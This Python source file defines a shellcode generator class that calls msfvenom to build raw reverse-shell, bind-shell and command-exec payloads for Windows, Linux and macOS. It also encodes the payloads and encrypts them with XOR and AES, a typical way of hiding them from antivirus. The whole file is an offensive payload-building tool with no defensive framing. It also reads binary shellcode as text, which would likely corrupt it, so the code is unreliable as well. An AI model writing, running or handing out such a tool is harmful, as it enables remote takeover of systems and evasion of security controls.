import base64
import binascii
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
import subprocess
import tempfile
import os

class ShellcodeGenerator:
    def __init__(self):
        self.msfvenom_path = "msfvenom"  # Path to msfvenom executable

    def generate_reverse_shell(self, host, port, platform='windows'):
        """Generate reverse shell shellcode for the specified platform"""
        try:
            if platform == 'windows':
                payload = f"windows/x64/shell_reverse_tcp"
            elif platform == 'linux':
                payload = f"linux/x64/shell_reverse_tcp"
            elif platform == 'macos':
                payload = f"osx/x64/shell_reverse_tcp"
            else:
                raise ValueError(f"Unsupported platform: {platform}")

            cmd = [
                self.msfvenom_path,
                "-p", payload,
                f"LHOST={host}",
                f"LPORT={port}",
                "-f", "raw"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise Exception(f"msfvenom failed: {result.stderr}")
            
            return result.stdout.encode()

        except Exception as e:
            print(f"Error generating reverse shell: {str(e)}")
            return None

    def generate_bind_shell(self, port, platform='windows'):
        """Generate bind shell shellcode for the specified platform"""
        try:
            if platform == 'windows':
                payload = f"windows/x64/shell_bind_tcp"
            elif platform == 'linux':
                payload = f"linux/x64/shell_bind_tcp"
            elif platform == 'macos':
                payload = f"osx/x64/shell_bind_tcp"
            else:
                raise ValueError(f"Unsupported platform: {platform}")

            cmd = [
                self.msfvenom_path,
                "-p", payload,
                f"LPORT={port}",
                "-f", "raw"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise Exception(f"msfvenom failed: {result.stderr}")
            
            return result.stdout.encode()

        except Exception as e:
            print(f"Error generating bind shell: {str(e)}")
            return None

    def generate_exec(self, command, platform='windows'):
        """Generate exec shellcode for the specified platform"""
        try:
            if platform == 'windows':
                payload = f"windows/x64/exec"
            elif platform == 'linux':
                payload = f"linux/x64/exec"
            elif platform == 'macos':
                payload = f"osx/x64/exec"
            else:
                raise ValueError(f"Unsupported platform: {platform}")

            cmd = [
                self.msfvenom_path,
                "-p", payload,
                f"CMD={command}",
                "-f", "raw"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise Exception(f"msfvenom failed: {result.stderr}")
            
            return result.stdout.encode()

        except Exception as e:
            print(f"Error generating exec shellcode: {str(e)}")
            return None

    def encode_shellcode(self, shellcode, encoding='base64'):
        """Encode shellcode using the specified encoding"""
        try:
            if encoding == 'base64':
                return base64.b64encode(shellcode)
            elif encoding == 'hex':
                return binascii.hexlify(shellcode)
            elif encoding == 'raw':
                return shellcode
            else:
                raise ValueError(f"Unsupported encoding: {encoding}")
        except Exception as e:
            print(f"Error encoding shellcode: {str(e)}")
            return None

    def xor_encrypt(self, data, key):
        """Encrypt data using XOR with the provided key"""
        try:
            if data is None:
                raise ValueError("Input shellcode for XOR encryption is None.")
            if isinstance(key, str):
                key = key.encode()
            key_len = len(key)
            return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])
        except Exception as e:
            print(f"[XOR Encrypt Error]: {str(e)}")
            return None

    def aes_encrypt(self, data, key):
        """Encrypt data using AES-256-CBC with the provided key"""
        try:
            # Ensure key is 32 bytes (AES-256)
            key = key.encode() if isinstance(key, str) else key
            key = key.ljust(32, b'\0')[:32]
            
            # Generate random IV
            iv = os.urandom(16)
            
            # Create cipher
            cipher = AES.new(key, AES.MODE_CBC, iv)
            
            # Pad and encrypt data
            padded_data = pad(data, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            
            # Return IV + encrypted data
            return iv + encrypted_data
        except Exception as e:
            print(f"Error in AES encryption: {str(e)}")
            return None

# Create a global instance
shellcode_gen = ShellcodeGenerator() 